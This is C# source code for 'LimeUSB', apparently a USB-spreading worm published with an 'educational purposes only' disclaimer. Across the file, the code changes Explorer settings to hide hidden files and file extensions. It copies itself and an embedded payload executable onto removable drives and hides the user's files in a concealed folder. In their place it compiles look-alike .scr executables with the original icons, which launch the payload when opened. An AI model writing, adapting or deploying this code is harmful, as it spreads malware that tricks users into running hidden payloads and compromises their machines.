using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Drawing.IconLib;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Drawing;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

//
//       │ Author     : NYAN CAT
//       │ Name       : LimeUSB v0.3

//       Contact Me   : https://github.com/NYAN-x-CAT
//       This program Is distributed for educational purposes only.
//

namespace LimeUSB_Csharp
{
    class Program
    {
        public static void Main()
        {
            Initialize();
        }

        public static void Initialize()
        {
            ExplorerOptions();

            foreach (DriveInfo USB in DriveInfo.GetDrives())
            {
                try
                {
                    if (USB.DriveType == DriveType.Removable && USB.IsReady)
                    {
                        if (!Directory.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory))
                        {
                            Directory.CreateDirectory(USB.RootDirectory.ToString() + Settings.WorkDirectory);
                            File.SetAttributes(USB.RootDirectory.ToString() + Settings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
                        }

                        if (!Directory.Exists((USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory)))
                            Directory.CreateDirectory((USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.IconsDirectory));

                        if (!File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile))
                            File.Copy(Application.ExecutablePath, USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);

                        if (!File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile))
                            File.WriteAllBytes(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\\" + Settings.PayloadFile,Properties.Resources.Payload);

                        CreteDirectory(USB.RootDirectory.ToString());
                        InfectFiles(USB.RootDirectory.ToString());
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Initialize " + ex.Message);
                }
            }
        }

        public static void ExplorerOptions()
        {
            RegistryKey Key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
            if (Key.GetValue("Hidden") != (object)2)
                Key.SetValue("Hidden", 2);
            if (Key.GetValue("HideFileExt") != (object)1)
                Key.SetValue("HideFileExt", 1);
        }

        public static void InfectFiles(string Path)
        {
            foreach (var File in Directory.GetFiles(Path))
            {
                try
                {
                    if (CheckIfInfected(File))
                    {
                        ChangeIcon(File);
                        System.IO.File.Move(File, File.Insert(3, Settings.WorkDirectory + "\\"));
                        CompileFile(File);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("InfectFiles " + ex.Message);
                }
            }

            foreach (var Directory in System.IO.Directory.GetDirectories(Path))
            {
                if (!Directory.Contains(Settings.WorkDirectory))
                    InfectFiles(Directory);
            }
        }

        public static void CreteDirectory(string USB_Directory)
        {
            foreach (var Directory in System.IO.Directory.GetDirectories(USB_Directory))
            {
                try
                {
                    if (!Directory.Contains(Settings.WorkDirectory))
                    {
                        if (!System.IO.Directory.Exists(Directory.Insert(3, Settings.WorkDirectory + "\\")))
                            System.IO.Directory.CreateDirectory(Directory.Insert(3, Settings.WorkDirectory + "\\"));
                        CreteDirectory(Directory);
                    }
                }
                catch
                {
                }
            }
        }

        public static bool CheckIfInfected(string File)
        {
            try
            {
                FileVersionInfo Info = FileVersionInfo.GetVersionInfo(File);
                if (Info.LegalTrademarks == Settings.InfectedTrademark)
                    return false;
                else
                    return true;
            }
            catch
            {
                return false;
            }
        }

        public static void ChangeIcon(string File)
        {
            try
            {
                Icon FileIcon = Icon.ExtractAssociatedIcon(File);
                MultiIcon MultiIcon = new MultiIcon();
                SingleIcon SingleIcon = MultiIcon.Add(Path.GetFileName(File));
                SingleIcon.CreateFrom(FileIcon.ToBitmap(), IconOutputFormat.Vista);
                SingleIcon.Save(Path.GetPathRoot(File) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(File.Replace(" ", null)) + ".ico");
            }
            catch { }
        }

        public static void CompileFile(string InfectedFile)
        {
            try
            {
                string Source = Properties.Resources.Source;
                Source = Source.Replace("%Payload%", Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.PayloadFile);
                Source = Source.Replace("%File%", InfectedFile.Insert(3, Settings.WorkDirectory + "\\"));
                Source = Source.Replace("%USB%", Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.LimeUSBFile);
                Source = Source.Replace("%Lime%", Settings.InfectedTrademark);
                Source = Source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
                Source = Source.Replace("%Guid%", Guid.NewGuid().ToString());

                CompilerParameters CParams = new CompilerParameters();
                Dictionary<string, string> ProviderOptions = new Dictionary<string, string>();
                ProviderOptions.Add("CompilerVersion", GetOS());

                string options = "/target:winexe /platform:x86 /optimize+";
                if (File.Exists(Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico"))
                    options += " /win32icon:\"" + Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", null)) + ".ico" + "\"";
                CParams.GenerateExecutable = true;
                CParams.OutputAssembly = InfectedFile + ".scr";
                CParams.CompilerOptions = options;
                CParams.TreatWarningsAsErrors = false;
                CParams.IncludeDebugInformation = false;
                CParams.ReferencedAssemblies.Add("System.dll");

                CompilerResults Results = new CSharpCodeProvider(ProviderOptions).CompileAssemblyFromSource(CParams, Source);

                //if (Results.Errors.Count > 0)
                //{
                //    MessageBox.Show(string.Format("The compiler has encountered {0} errors",
                //         Results.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
                //         MessageBoxIcon.Error);

                //    foreach (CompilerError Err in Results.Errors)
                //    {
                //        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", Err.ErrorText,
                //            Err.Line, Err.Column, Err.FileName), "Error",
                //            MessageBoxButtons.OK, MessageBoxIcon.Error);
                //    }
                //    return;
                //}
            }
            catch (Exception ex)
            {
                Debug.WriteLine("CompileFile " + ex.Message);
            }
        }

        public static string GetOS()
        {
            var OS = new Microsoft.VisualBasic.Devices.ComputerInfo();
            if (OS.OSFullName.Contains("7"))
                return "v2.0";
            else
                return "v4.0";
        }

        public static string Randomz(int L)
        {
                string validchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                StringBuilder sb = new StringBuilder();
                Random rand = new Random();
                for (int i = 1; i <= L; i++)
                {
                    int idx = rand.Next(0, validchars.Length);
                    char randomChar = validchars[idx];
                    sb.Append(randomChar);
                }
                var randomString = sb.ToString();
                return randomString;
        }
    }

    public class Settings
    {
        public static readonly string InfectedTrademark = "Trademark - Lime";
        public static readonly string WorkDirectory = "$LimeUSB";
        public static readonly string LimeUSBFile = "LimeUSB.exe";
        public static readonly string PayloadFile = "Payload.exe";
        public static readonly string IconsDirectory = "$LimeIcons";
    }

}
